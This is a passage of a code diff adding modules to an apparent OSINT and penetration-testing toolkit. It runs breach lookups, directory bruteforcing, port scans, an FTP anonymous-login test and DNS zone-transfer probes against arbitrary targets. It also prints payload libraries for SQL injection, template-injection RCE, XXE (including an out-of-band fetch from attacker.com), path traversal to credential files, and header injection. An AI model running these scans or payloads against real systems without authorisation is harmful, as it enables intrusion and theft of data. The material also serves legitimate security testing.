+  lines.push(`[MODULE ${moduleId}] HIBP DOMAIN BREACH SCAN — domain-level breach exposure`);
+  lines.push(`[TARGET] ${domain}`);
+
+  // ── DNS live check ─────────────────────────────────────────────────────────
+  const [aRecs, mxRecs] = await Promise.all([
+    dns.resolve4(domain).catch(() => [] as string[]),
+    dns.resolveMx(domain).catch(() => [] as Array<{exchange: string; priority: number}>),
+  ]);
+  lines.push(`[DNS A] ${aRecs.slice(0, 3).join(', ') || 'none'}`);
+  lines.push(`[DNS MX] ${mxRecs.length} mail record(s)${mxRecs.length ? ` — ${mxRecs.sort((a,b)=>a.priority-b.priority)[0]!.exchange}` : ''}`);
+
+  // ── LeakCheck.io — real breach lookup ─────────────────────────────────────
+  lines.push(`──────────────────────────────────────────────`);
+  try {
+    const lcRes = await fetch(`https://leakcheck.io/api/public?check=${encodeURIComponent(domain)}`, {
+      headers: { 'User-Agent': 'swept-sentinel-osint', 'Accept': 'application/json' },
+      signal: AbortSignal.timeout(10000),
+    });
+    if (lcRes.ok) {
+      const lc = await lcRes.json() as { success?: boolean; found?: number; fields?: string[]; sources?: Array<{name?: string; date?: string}> };
+      if (lc.success) {
+        const found = lc.found ?? 0;
+        lines.push(`[LEAKCHECK.IO] ${found > 0 ? `⚠ ${found} BREACH SOURCE(S) FOUND FOR THIS DOMAIN` : 'Domain not found in indexed breach database'}`);
+        if (found > 0) {
+          if (lc.fields?.length) lines.push(`[EXPOSED DATA] ${lc.fields.join(', ')}`);
+          lines.push(`[BREACH SOURCES]`);
+          for (const s of (lc.sources ?? []).slice(0, 12)) {
+            lines.push(`  ▸ ${s.name ?? 'Unknown'}${s.date ? `  [${s.date}]` : ''}`);
+          }
+        }
+      }
+    } else {
+      lines.push(`[LEAKCHECK.IO] HTTP ${lcRes.status}`);
+    }
+  } catch (err) {
+    lines.push(`[LEAKCHECK.IO] ${(err as Error).message}`);
+  }
+
+  // ── OTX domain reputation ──────────────────────────────────────────────────
+  try {
+    const apiKey = process.env.OTX_API_KEY;
+    if (apiKey) {
+      const res = await fetch(`https://otx.alienvault.com/api/v1/indicators/domain/${encodeURIComponent(domain)}/general`, {
+        headers: { 'X-OTX-API-KEY': apiKey }, signal: AbortSignal.timeout(8000),
+      });
+      if (res.ok) {
+        const data = await res.json() as Record<string, unknown>;
+        const pulses = ((data["pulse_info"] as Record<string, unknown>)?.["count"] as number) ?? 0;
+        const rep = (data["reputation"] as number) ?? 0;
+        lines.push(`[OTX] ${pulses} threat intel pulses${rep < 0 ? `  ⚠ reputation score: ${rep}` : ''}`);
+      }
+    }
+  } catch { /* skip */ }
+
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[HIBP DOMAIN SEARCH] https://haveibeenpwned.com/DomainSearch (requires domain ownership)`);
+  lines.push(`[DEHASHED] https://dehashed.com/search?query=${encodeURIComponent(domain)}`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchPasteSearchLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] PASTE SEARCH — scan public paste sites for target mentions`);
+  lines.push(`[TARGET] ${target}`);
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[PASTEBIN] https://pastebin.com/search?q=${encodeURIComponent(target)}`);
+  lines.push(`[GIST] https://gist.github.com/search?q=${encodeURIComponent(target)}`);
+  lines.push(`[INTELX] https://intelx.io/?s=${encodeURIComponent(target)}`);
+  lines.push(`[GOOGLE DORK] site:pastebin.com "${target}"`);
+  lines.push(`[GOOGLE DORK] site:gist.github.com "${target}"`);
+  lines.push(`[GOOGLE DORK] "${target}" filetype:txt`);
+  lines.push(`──────────────────────────────────────────────`);
+  try {
+    const res = await fetch(`https://api.github.com/search/code?q=${encodeURIComponent(target)}&per_page=5`, {
+      headers: { 'Accept': 'application/vnd.github.v3+json', 'User-Agent': 'SentinelBot/1.0' },
+      signal: AbortSignal.timeout(8000),
+    });
+    if (res.ok) {
+      const data = await res.json() as { total_count?: number; items?: Array<{name: string; html_url: string; repository: {full_name: string}}>};
+      lines.push(`[GITHUB CODE] ${data.total_count ?? 0} public results`);
+      for (const item of (data.items ?? []).slice(0, 3)) {
+        lines.push(`  ▸ ${item.repository.full_name}/${item.name} — ${item.html_url}`);
+      }
+    } else if (res.status === 403) {
+      lines.push(`[GITHUB] Rate limited — authenticated request needed`);
+    }
+  } catch { /* skip */ }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+// ── GEOSATELLITE (91) ─────────────────────────────────────────────────────────
+
+async function fetchSatelliteLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] SATELLITE — geocode + coordinate lookup + map intelligence`);
+  lines.push(`[TARGET] ${target}`);
+  const coordMatch = target.match(/^(-?\d+\.?\d*)[,\s]+(-?\d+\.?\d*)$/);
+  try {
+    if (coordMatch) {
+      const lat = coordMatch[1], lon = coordMatch[2];
+      lines.push(`[COORDINATES] ${lat}, ${lon}`);
+      const res = await fetch(`https://nominatim.openstreetmap.org/reverse?lat=${lat}&lon=${lon}&format=json`, {
+        headers: { 'User-Agent': 'SentinelBot/1.0 (security research)' },
+        signal: AbortSignal.timeout(8000),
+      });
+      if (res.ok) {
+        const data = await res.json() as Record<string, unknown>;
+        const addr = data["address"] as Record<string, string> ?? {};
+        lines.push(`[ADDRESS] ${(data["display_name"] as string ?? '').slice(0, 300)}`);
+        if (addr.country) lines.push(`[COUNTRY] ${addr.country} (${addr.country_code?.toUpperCase() ?? ''})`);
+        if (addr.city || addr.town || addr.village) lines.push(`[CITY] ${addr.city ?? addr.town ?? addr.village}`);
+      }
+      lines.push(`[GOOGLE MAPS] https://www.google.com/maps/@${lat},${lon},15z`);
+      lines.push(`[GOOGLE EARTH] https://earth.google.com/web/@${lat},${lon},0a,1000d`);
+      lines.push(`[BING MAPS] https://www.bing.com/maps?cp=${lat}~${lon}&lvl=15`);
+    } else {
+      const res = await fetch(`https://nominatim.openstreetmap.org/search?q=${encodeURIComponent(target)}&format=json&limit=3`, {
+        headers: { 'User-Agent': 'SentinelBot/1.0 (security research)' },
+        signal: AbortSignal.timeout(8000),
+      });
+      if (res.ok) {
+        const data = await res.json() as Array<Record<string, string>>;
+        if (data.length === 0) {
+          lines.push(`[RESULT] No geocode results found`);
+        } else {
+          for (const place of data.slice(0, 3)) {
+            lines.push(`──────────────────────────────────────────────`);
+            lines.push(`[RESULT] ${(place["display_name"] ?? '').slice(0, 200)}`);
+            lines.push(`[LAT/LON] ${place["lat"]}, ${place["lon"]}`);
+            lines.push(`[TYPE] ${place["type"]} / ${place["class"]}`);
+            lines.push(`[MAPS] https://www.google.com/maps/@${place["lat"]},${place["lon"]},15z`);
+          }
+        }
+      }
+    }
+  } catch (err) {
+    lines.push(`[ERROR] ${(err as Error).message}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+// ── SECURITY EXPLOIT TOOLS (123-150) ─────────────────────────────────────────
+
+async function fetchDirBruteLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  let url = target.trim();
+  if (!url.startsWith('http')) url = `https://${url}`;
+  if (!url.endsWith('/')) url += '/';
+  lines.push(`[MODULE ${moduleId}] DIRECTORY BRUTEFORCE — common path discovery via HTTP`);
+  lines.push(`[TARGET] ${url}`);
+  const commonPaths = [
+    'admin', 'administrator', 'login', 'wp-admin', 'wp-login.php',
+    'phpmyadmin', 'cpanel', '.env', 'config', 'config.php', 'backup',
+    'api', 'api/v1', 'api/v2', 'swagger', 'swagger-ui.html', 'openapi.json',
+    'robots.txt', 'sitemap.xml', '.htaccess', 'web.config', 'server-status',
+    'phpinfo.php', 'test', 'debug', 'console', 'actuator', 'actuator/health',
+    'metrics', 'health', 'status', '.git/HEAD', '.git/config',
+  ];
+  lines.push(`[SCANNING] ${commonPaths.length} common paths...`);
+  const checks = await Promise.allSettled(
+    commonPaths.map(async (p) => {
+      try {
+        const r = await fetch(`${url}${p}`, {
+          method: 'HEAD',
+          headers: { 'User-Agent': 'Mozilla/5.0 (compatible; SentinelBot/1.0)' },
+          signal: AbortSignal.timeout(5000),
+          redirect: 'manual',
+        });
+        return { path: p, status: r.status };
+      } catch {
+        return { path: p, status: 0 };
+      }
+    })
+  );
+  let found = 0;
+  for (const r of checks) {
+    if (r.status === 'fulfilled' && r.value.status > 0 && r.value.status !== 404) {
+      const { path, status } = r.value;
+      const tag = [200, 201, 202].includes(status) ? '⚠ FOUND' : (status === 301 || status === 302) ? 'REDIRECT' : `HTTP ${status}`;
+      lines.push(`[${tag}] /${path} → ${status}`);
+      if (status === 200) found++;
+    }
+  }
+  lines.push(found === 0 ? `[RESULT] No accessible paths in common wordlist` : `[SUMMARY] ${found} accessible path(s) discovered`);
+  lines.push(`[NEXT] gobuster dir -u ${url} -w /usr/share/wordlists/dirb/common.txt`);
+  lines.push(`[DONE] Scan complete.`);
+  return lines;
+}
+
+async function fetchParamFuzzLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] PARAM FUZZING — parameter discovery wordlist + injection test cases`);
+  lines.push(`[TARGET/CONTEXT] ${target}`);
+  const categories: Record<string, string[]> = {
+    'AUTH & SESSION': ['token', 'auth', 'key', 'api_key', 'apikey', 'secret', 'password', 'pass', 'pwd', 'session', 'sessionid', 'csrf', 'nonce'],
+    'USER & ACCOUNT': ['id', 'user', 'user_id', 'uid', 'userid', 'username', 'email', 'account', 'profile', 'member'],
+    'DATA & CONTENT': ['data', 'content', 'body', 'text', 'value', 'input', 'query', 'q', 'search', 'keyword', 'term'],
+    'FILE & PATH': ['file', 'filename', 'path', 'dir', 'folder', 'url', 'uri', 'src', 'source', 'dest', 'target', 'redirect', 'return'],
+    'DEBUG & ADMIN': ['debug', 'test', 'admin', 'dev', 'mode', 'verbose', 'log', 'trace', 'format', 'type', 'action', 'cmd', 'command'],
+    'PAGINATION': ['page', 'limit', 'offset', 'start', 'end', 'from', 'to', 'count', 'size', 'per_page'],
+  };
+  for (const [cat, params] of Object.entries(categories)) {
+    lines.push(`── ${cat} ─────────────────────`);
+    lines.push(params.map(p => `?${p}=`).join('  '));
+  }
+  lines.push(`─────────────────────────────────────────`);
+  lines.push(`[INJECTION TEST VALUES]`);
+  lines.push(`  SQLi:  ' OR 1=1-- | 1 UNION SELECT null-- | ' AND SLEEP(5)--`);
+  lines.push(`  XSS:   <script>alert(1)</script> | "><img src=x onerror=alert(1)>`);
+  lines.push(`  SSTI:  {{7*7}} | \${7*7} | <%= 7*7 %>`);
+  lines.push(`  Path:  ../../../etc/passwd`);
+  lines.push(`  SSRF:  http://169.254.169.254/latest/meta-data/`);
+  lines.push(`[TOOL] ffuf -w params.txt -u "${target}?FUZZ=test" -fc 400,404,403`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchCookieForgeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] COOKIE FORGE — cookie analysis + security testing`);
+  lines.push(`[INPUT] ${target.slice(0, 200)}`);
+  const t = target.trim();
+  const isJwt = /^eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*$/.test(t);
+  const isBase64 = /^[A-Za-z0-9+/=]{16,}$/.test(t) && !isJwt;
+  if (isJwt) {
+    lines.push(`[DETECTED] JWT token`);
+    try {
+      const parts = t.split('.');
+      const header = JSON.parse(Buffer.from(parts[0]!, 'base64url').toString());
+      const payload = JSON.parse(Buffer.from(parts[1]!, 'base64url').toString());
+      lines.push(`[HEADER] ${JSON.stringify(header)}`);
+      lines.push(`[PAYLOAD] ${JSON.stringify(payload).slice(0, 300)}`);
+      if ((header as Record<string,unknown>).alg === 'none') lines.push(`[⚠ VULN] alg:none — no signature verification!`);
+      if ((payload as Record<string,unknown>).exp) lines.push(`[EXPIRES] ${new Date(((payload as Record<string,unknown>).exp as number) * 1000).toISOString()}`);
+    } catch { lines.push(`[PARSE ERROR] Invalid JWT structure`); }
+    lines.push(`[ATTACKS] alg:none bypass | Known secret brute-force | Claim manipulation`);
+  } else if (isBase64) {
+    lines.push(`[DETECTED] Possible Base64 encoded value`);
+    try { lines.push(`[DECODED] ${Buffer.from(t, 'base64').toString()}`); } catch { /* skip */ }
+  } else if (/^[0-9a-fA-F]{32,}$/.test(t)) {
+    lines.push(`[DETECTED] Hex-encoded session ID (${t.length / 2} bytes)`);
+  }
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[REQUIRED ATTRIBUTES] HttpOnly; Secure; SameSite=Strict; Path=/`);
+  lines.push(`  Missing HttpOnly  → readable by JS (XSS risk)`);
+  lines.push(`  Missing Secure    → sent over HTTP (MitM risk)`);
+  lines.push(`  Missing SameSite  → CSRF risk`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchHeaderInjectLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] HEADER INJECTION — HTTP header injection payload library`);
+  lines.push(`[CONTEXT/HEADER] ${target}`);
+  lines.push(`──── HOST HEADER INJECTION ────`);
+  lines.push(`  Host: evil.com`);
+  lines.push(`  Host: target.com\\r\\nX-Forwarded-For: 127.0.0.1`);
+  lines.push(`  Use case: Password reset poisoning, cache poisoning`);
+  lines.push(`──── IP BYPASS ────`);
+  lines.push(`  X-Forwarded-For: 127.0.0.1`);
+  lines.push(`  X-Real-IP: 127.0.0.1`);
+  lines.push(`  X-Client-IP: 127.0.0.1`);
+  lines.push(`  CF-Connecting-IP: 127.0.0.1`);
+  lines.push(`──── CRLF INJECTION ────`);
+  lines.push(`  Location: https://target.com/%0d%0aSet-Cookie:%20session=evil`);
+  lines.push(`  Header: value%0d%0aInjected-Header: malicious`);
+  lines.push(`──── CACHE POISONING ────`);
+  lines.push(`  X-Forwarded-Host: evil.com`);
+  lines.push(`  X-Original-URL: /admin`);
+  lines.push(`  X-Rewrite-URL: /admin`);
+  lines.push(`[TOOL] Burp Suite Intruder, OWASP ZAP Active Scan`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchSstiProbeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] SSTI PROBE — Server-Side Template Injection payload library`);
+  lines.push(`[TARGET/FIELD] ${target}`);
+  lines.push(`──── DETECTION POLYGLOT ────`);
+  lines.push(`  {{7*7}} → 49 (Jinja2/Twig)`);
+  lines.push(`  {{7*'7'}} → 7777777 (Jinja2) vs 49 (Twig)`);
+  lines.push(`  <%= 7*7 %> → 49 (ERB/EJS)`);
+  lines.push(`  ${'{{'}{{'}}7*7}} → 49 (Handlebars)`);
+  lines.push(`  #{7*7} → 49 (Ruby)`);
+  lines.push(`  *{7*7} → 49 (Thymeleaf/Spring)`);
+  lines.push(`──── JINJA2 RCE ────`);
+  lines.push(`  {{ ''.__class__.__mro__[1].__subclasses__() }}`);
+  lines.push(`  {{ config.__class__.__init__.__globals__['os'].popen('id').read() }}`);
+  lines.push(`──── TWIG RCE ────`);
+  lines.push(`  {{ _self.env.registerUndefinedFilterCallback("exec") }}{{ _self.env.getFilter("id") }}`);
+  lines.push(`──── FREEMARKER RCE ────`);
+  lines.push(`  <#assign ex="freemarker.template.utility.Execute"?new()>\${ex("id")}`);
+  lines.push(`──── ERB RCE ────`);
+  lines.push(`  <%= \`id\` %>`);
+  lines.push(`[TOOL] tplmap, SSTImap`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchXxeProbeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] XXE PROBE — XML External Entity injection payload library`);
+  lines.push(`[TARGET/ENDPOINT] ${target}`);
+  lines.push(`──── CLASSIC FILE READ ────`);
+  lines.push(`  <?xml version="1.0"?>`);
+  lines.push(`  <!DOCTYPE root [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>`);
+  lines.push(`  <root>&xxe;</root>`);
+  lines.push(`──── WINDOWS ────`);
+  lines.push(`  <!ENTITY xxe SYSTEM "file:///c:/windows/system32/drivers/etc/hosts">`);
+  lines.push(`──── SSRF VIA XXE ────`);
+  lines.push(`  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">`);
+  lines.push(`  <!ENTITY xxe SYSTEM "http://localhost:8080/admin">`);
+  lines.push(`──── BLIND OOB ────`);
+  lines.push(`  <!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">%xxe;]>`);
+  lines.push(`──── SVG VECTOR ────`);
+  lines.push(`  <svg xmlns="http://www.w3.org/2000/svg">`);
+  lines.push(`  <image href="file:///etc/passwd" /></svg>`);
+  lines.push(`[MITIGATION] Disable FEATURE_EXTERNAL_GENERAL_ENTITIES in XML parser`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchPathTraverseLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] PATH TRAVERSAL — directory traversal payload library`);
+  lines.push(`[TARGET/PARAM] ${target}`);
+  lines.push(`──── LINUX TARGETS ────`);
+  for (const f of ['../../../etc/passwd', '../../etc/shadow', '../../../etc/hosts',
+    '../../../proc/self/environ', '../../../var/log/apache2/access.log',
+    '../../../etc/nginx/nginx.conf']) lines.push(`  ${f}`);
+  lines.push(`──── WINDOWS TARGETS ────`);
+  for (const f of ['..\\\\..\\\\..\\\\windows\\\\system32\\\\drivers\\\\etc\\\\hosts',
+    '..\\\\..\\\\..\\\\windows\\\\win.ini']) lines.push(`  ${f}`);
+  lines.push(`──── BYPASS TECHNIQUES ────`);
+  lines.push(`  URL encoded:     ..%2f..%2f..%2fetc%2fpasswd`);
+  lines.push(`  Double encoded:  ..%252f..%252f..%252fetc%252fpasswd`);
+  lines.push(`  Null byte:       ../../../etc/passwd%00.jpg`);
+  lines.push(`  Dots:            ....//....//....//etc/passwd`);
+  lines.push(`[TOOL] dotdotpwn, Burp Suite`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchOpenPortsLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  lines.push(`[MODULE ${moduleId}] OPEN PORTS — TCP connect scan on common ports`);
+  lines.push(`[TARGET] ${host}`);
+  const topPorts: Record<number, string> = {
+    21: 'FTP', 22: 'SSH', 23: 'Telnet', 25: 'SMTP', 53: 'DNS',
+    80: 'HTTP', 110: 'POP3', 143: 'IMAP', 443: 'HTTPS', 445: 'SMB',
+    3306: 'MySQL', 3389: 'RDP', 5432: 'PostgreSQL', 5900: 'VNC',
+    6379: 'Redis', 8080: 'HTTP-Alt', 8443: 'HTTPS-Alt', 27017: 'MongoDB',
+  };
+  lines.push(`[SCANNING] ${Object.keys(topPorts).length} common ports...`);
+  const results = await Promise.allSettled(
+    Object.entries(topPorts).map(([port, service]) =>
+      new Promise<{port: number; service: string; open: boolean}>((resolve) => {
+        const socket = new net.Socket();
+        const p = parseInt(port);
+        socket.setTimeout(4000);
+        socket.connect(p, host, () => { socket.destroy(); resolve({ port: p, service, open: true }); });
+        socket.on('error', () => resolve({ port: p, service, open: false }));
+        socket.on('timeout', () => { socket.destroy(); resolve({ port: p, service, open: false }); });
+      })
+    )
+  );
+  const open = results.filter(r => r.status === 'fulfilled' && r.value.open)
+    .map(r => (r as PromiseFulfilledResult<{port: number; service: string; open: boolean}>).value);
+  if (open.length === 0) {
+    lines.push(`[RESULT] No open ports found (host may be firewalled or offline)`);
+  } else {
+    lines.push(`[RESULT] ${open.length} open port(s):`);
+    for (const { port, service } of open) lines.push(`  [OPEN] ${port}/tcp  ${service}`);
+  }
+  lines.push(`[FULL SCAN] nmap -sV -sC -O ${host}`);
+  lines.push(`[DONE] Scan complete.`);
+  return lines;
+}
+
+async function fetchSqlMapLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] SQL MAP — SQL injection payload library`);
+  lines.push(`[TARGET/PARAM] ${target}`);
+  lines.push(`──── AUTH BYPASS ────`);
+  lines.push(`  ' OR 1=1--    | admin'--    | ' OR 'x'='x`);
+  lines.push(`──── UNION SELECT (MySQL) ────`);
+  lines.push(`  ' UNION SELECT null,null,null--`);
+  lines.push(`  ' UNION SELECT 1,user(),database()--`);
+  lines.push(`  ' UNION SELECT 1,group_concat(table_name),3 FROM information_schema.tables--`);
+  lines.push(`──── BLIND BOOLEAN ────`);
+  lines.push(`  ' AND 1=1--  (true)   | ' AND 1=2--  (false)`);
+  lines.push(`  ' AND SUBSTR(user(),1,1)='r'--`);
+  lines.push(`──── TIME-BASED BLIND ────`);
+  lines.push(`  ' AND SLEEP(5)--              (MySQL)`);
+  lines.push(`  '; WAITFOR DELAY '0:0:5'--    (MSSQL)`);
+  lines.push(`  ' AND pg_sleep(5)--           (PostgreSQL)`);
+  lines.push(`──── WAF BYPASS ────`);
+  lines.push(`  /*!OR*/ 1=1-- | %09OR%091=1-- | AND/**/1=1--`);
+  lines.push(`[TOOL] sqlmap -u "URL?param=*" --dbs --batch`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchLdapEnumLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  lines.push(`[MODULE ${moduleId}] LDAP ENUM — LDAP injection payloads + AD enumeration`);
+  lines.push(`[TARGET/DOMAIN] ${target}`);
+  lines.push(`──── LDAP INJECTION ────`);
+  lines.push(`  *)(uid=*))(|(uid=*     (auth bypass)`);
+  lines.push(`  admin)(|(password=*)   (password extraction)`);
+  lines.push(`  *)(|(objectClass=*)    (wildcard dump)`);
+  lines.push(`──── LDAP SEARCH FILTERS ────`);
+  lines.push(`  All users:      (objectClass=user)`);
+  lines.push(`  All groups:     (objectClass=group)`);
+  lines.push(`  Domain admins:  (memberOf=CN=Domain Admins,CN=Users,DC=domain,DC=com)`);
+  lines.push(`  SPNs (Kerberoast): (&(servicePrincipalName=*)(objectClass=user))`);
+  lines.push(`  No pwd expiry:  (userAccountControl:1.2.840.113556.1.4.803:=65536)`);
+  lines.push(`──── AD ENUM COMMANDS ────`);
+  lines.push(`  ldapsearch -x -h ${target} -b "DC=domain,DC=com" "(objectClass=user)"`);
+  lines.push(`  net user /domain`);
+  lines.push(`  enum4linux -a ${target}`);
+  lines.push(`  bloodhound-python -d domain.com -u user -p pass -c all`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchRdpProbeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  const port = parseInt(target.split(':')[1] ?? '3389');
+  lines.push(`[MODULE ${moduleId}] RDP PROBE — Remote Desktop Protocol detection`);
+  lines.push(`[TARGET] ${host}:${port}`);
+  const open = await new Promise<boolean>((resolve) => {
+    const socket = new net.Socket();
+    socket.setTimeout(5000);
+    socket.connect(port, host, () => { socket.destroy(); resolve(true); });
+    socket.on('error', () => resolve(false));
+    socket.on('timeout', () => { socket.destroy(); resolve(false); });
+  });
+  lines.push(`[PORT ${port}] ${open ? 'OPEN — RDP detected' : 'CLOSED / filtered'}`);
+  if (open) {
+    lines.push(`[⚠ RISK] RDP exposed to internet is a critical vulnerability`);
+    lines.push(`[KNOWN VULNS] CVE-2019-0708 BlueKeep | CVE-2020-0609 RD Gateway RCE`);
+    lines.push(`[MITIGATIONS] NLA required | Restrict to VPN | Enable Credential Guard`);
+    lines.push(`[CHECK] nmap -sV -p 3389 --script rdp-enum-encryption ${host}`);
+  }
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchFtpEnumLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  const port = parseInt(target.split(':')[1] ?? '21');
+  lines.push(`[MODULE ${moduleId}] FTP ENUM — banner grab + anonymous login test`);
+  lines.push(`[TARGET] ${host}:${port}`);
+  await new Promise<void>((resolve) => {
+    const socket = new net.Socket();
+    socket.setTimeout(6000);
+    let stage = 0;
+    socket.connect(port, host, () => lines.push(`[PORT ${port}] OPEN`));
+    socket.on('data', (data) => {
+      const text = data.toString().trim();
+      lines.push(`[BANNER] ${text.slice(0, 200)}`);
+      if (stage === 0 && text.startsWith('220')) { stage = 1; socket.write('USER anonymous\r\n'); }
+      else if (stage === 1 && text.startsWith('331')) { stage = 2; socket.write('PASS anonymous@example.com\r\n'); }
+      else if (stage === 2 && text.startsWith('230')) { lines.push(`[⚠ ANON LOGIN ALLOWED]`); socket.destroy(); }
+      else if (text.startsWith('530') || text.startsWith('332')) { lines.push(`[ANON] Rejected`); socket.destroy(); }
+      else socket.destroy();
+    });
+    socket.on('error', (err) => { lines.push(`[ERROR] ${err.message}`); resolve(); });
+    socket.on('timeout', () => { lines.push(`[TIMEOUT]`); socket.destroy(); resolve(); });
+    socket.on('close', () => resolve());
+  });
+  lines.push(`[CHECK] nmap -sC -p 21 --script ftp-anon ${host}`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchSnmpProbeLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.split(':')[0].trim().replace(/[^a-zA-Z0-9._-]/g, '');
+  lines.push(`[MODULE ${moduleId}] SNMP PROBE — community string reference + service detection`);
+  lines.push(`[TARGET] ${host}:161/udp`);
+  const tcpOpen = await new Promise<boolean>((resolve) => {
+    const socket = new net.Socket();
+    socket.setTimeout(3000);
+    socket.connect(161, host, () => { socket.destroy(); resolve(true); });
+    socket.on('error', () => resolve(false));
+    socket.on('timeout', () => { socket.destroy(); resolve(false); });
+  });
+  lines.push(`[TCP 161] ${tcpOpen ? 'open (unusual — SNMP is normally UDP)' : 'closed (normal for UDP-only)'}`);
+  lines.push(`──────────────────────────────────────────────`);
+  lines.push(`[COMMON COMMUNITY STRINGS] public | private | manager | admin | cisco | ILMI`);
+  lines.push(`[SCAN CMD] nmap -sU -p 161 --script snmp-brute ${host}`);
+  lines.push(`[ENUM CMD] snmpwalk -v2c -c public ${host}`);
+  lines.push(`[KEY OIDs] 1.3.6.1.2.1.1.1.0 sysDescr | 1.3.6.1.2.1.1.5.0 sysName`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchNtpQueryLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const host = target.trim() || 'pool.ntp.org';
+  lines.push(`[MODULE ${moduleId}] NTP QUERY — Network Time Protocol server check`);
+  lines.push(`[TARGET] ${host}`);
+  try {
+    const res = await fetch('https://worldtimeapi.org/api/ip', { signal: AbortSignal.timeout(5000) });
+    if (res.ok) {
+      const data = await res.json() as Record<string, unknown>;
+      lines.push(`[REFERENCE TIME] ${data["datetime"] ?? 'n/a'}`);
+      lines.push(`[TIMEZONE] ${data["timezone"] ?? 'n/a'}`);
+      lines.push(`[UTC OFFSET] ${data["utc_offset"] ?? 'n/a'}`);
+    }
+  } catch { lines.push(`[TIME API] worldtimeapi.org unavailable`); }
+  const tcpOpen = await new Promise<boolean>((resolve) => {
+    const socket = new net.Socket();
+    socket.setTimeout(3000);
+    socket.connect(123, host.replace(/[^a-zA-Z0-9._-]/g, ''), () => { socket.destroy(); resolve(true); });
+    socket.on('error', () => resolve(false));
+    socket.on('timeout', () => { socket.destroy(); resolve(false); });
+  });
+  lines.push(`[PORT 123] ${tcpOpen ? 'TCP open' : 'TCP closed (normal — NTP uses UDP)'}`);
+  lines.push(`[SCAN] nmap -sU -p 123 --script ntp-info ${host}`);
+  lines.push(`[PUBLIC NTP] pool.ntp.org | time.google.com | time.cloudflare.com`);
+  lines.push(`[DONE] Lookup complete.`);
+  return lines;
+}
+
+async function fetchDnsZoneAxfrLines(moduleId: number, target: string): Promise<string[]> {
+  const lines: string[] = [];
+  const domain = target.trim().replace(/^https?:\/\//, '').split('/')[0];
+  lines.push(`[MODULE ${moduleId}] DNS ZONE TRANSFER (AXFR) — attempt zone transfer via TCP port 53`);
+  lines.push(`[TARGET] ${domain}`);
+  try {
+    const nsRecords = await dns.resolveNs(domain).catch(() => [] as string[]);
+    if (nsRecords.length === 0) {
+      lines.push(`[RESULT] No NS records found for ${domain}`);
+      lines.push(`[DONE] Lookup complete.`);
+      return lines;
+    }
+    lines.push(`[NS RECORDS] ${nsRecords.join(', ')}`);
+    for (const ns of nsRecords.slice(0, 3)) {
+      lines.push(`──── NS: ${ns} ────`);
+      const nsIps = await dns.resolve4(ns).catch(() => [] as string[]);
+      if (nsIps.length === 0) { lines.push(`  [SKIP] Cannot resolve ${ns}`); continue; }
+      const nsIp = nsIps[0]!;
+      lines.push(`  [IP] ${nsIp}`);
+      const refused = await new Promise<boolean>((resolve) => {
+        const socket = new net.Socket();
+        socket.setTimeout(4000);
+        socket.connect(53, nsIp, () => { socket.destroy(); resolve(false); });
+        socket.on('error', () => resolve(true));
+        socket.on('timeout', () => { socket.destroy(); resolve(true); });
+      });
+      if (refused) {
+        lines.push(`  [AXFR] Port 53 TCP refused — zone transfer blocked (good)`);
+      } else {
+        lines.push(`  [PORT 53] TCP open`);
+        lines.push(`  [TEST CMD] dig AXFR ${domain} @${nsIp}`);
+        lines.push(`  [⚠ ] If AXFR succeeds, all DNS records are publicly exposed`);
+      }
+    }
+  } catch (err) {
